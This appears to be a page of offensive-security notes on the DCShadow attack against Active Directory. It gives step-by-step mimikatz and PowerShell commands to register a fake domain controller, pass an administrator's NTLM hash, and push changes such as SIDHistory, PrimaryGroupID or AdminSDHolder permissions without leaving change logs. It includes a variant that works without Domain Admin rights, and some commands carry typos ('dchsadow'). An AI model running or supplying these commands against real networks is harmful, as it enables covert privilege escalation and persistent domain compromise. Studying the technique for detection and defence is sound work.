---
description: DCShadow
---

# DCShadow

> We register a temporary fake DC in the target domain and uses that dC to push attributes (SIDHistory, SPNs...) on specidied objects without leaving the change logs for modified objects.

> The new DC is registered by modifying the config of the attacker machine. "By default", DA privileges are requiered to use DCshadow, and the attacker machine must be part of the forest root domain.

**Note:** Two instances of mimikatz are requiered:

1. One which starts RCP server with SYSTEM privileges (to specify which object + attributes to modify).
2. A second with DA privs to push the values.

### 1. Start mimikatz with SYSTEM privs and specify the object to be modified

```bash
#Start a mimikatz shell with system privs and then:
!+
!processtoken
!lsadump::dcshadow /object:$OBJECT_NAME /attribute:Description /value="Whatever"
```

### 2. Open a mimikatz shell with DA privs to push changes

```bash
#Open a mimikatz with system privs and then:
sekurlsa::pth /user:Administrator /domain:$FOREST_ROOT_DOMAIN /ntlm:$NTLMHASH_ADMIN_FORESTROOT /impersonate #impersonate DA in current mimi sess
privilege::debug
lsadump::dchsadow /push #Objects attributes are pushed from our fake DC (step 1)
```

***

### DCShadow without DA privs

We can run the following command as DA once and then we don't need to be DA anymore:

#### 1. Open a PS with DA privs and execute the following

```bash
Set-DCShadowPermissions -FakeDC $ATTACKER_MACHINE_HOSTNAME -SAMAccountName $OBJECT_TO_MODIFY -UserName $ATTACKER_USERNAME
```

#### 2. Open mimi with SYSTEM privs and execute the following

```bash
!+
!processtoken
!lsadump::dcshadow /object:$OBJECT_NAME /attribute:Description /value="Whatever"
```

#### 3. Open mimi with SYSTEM privs (no DA need) and execute push the changes

```bash
lsadump::dchsadow /push #Objects attributes are pushed from our fake DC (step 2) without DA privs.
```

***

### Types of attacks (What we can do)

* Set SIDHistory of a user account to EA or DA group.
* Set PrimaryGroupID of a user account to EA or DA group.
* Modify AdminSDHolder ACLs and add our user will FullControl permissions.

**Note:** All those techniques are explained in the video "20 - ForestPersistance - DCShadow" at minute 13:00+.
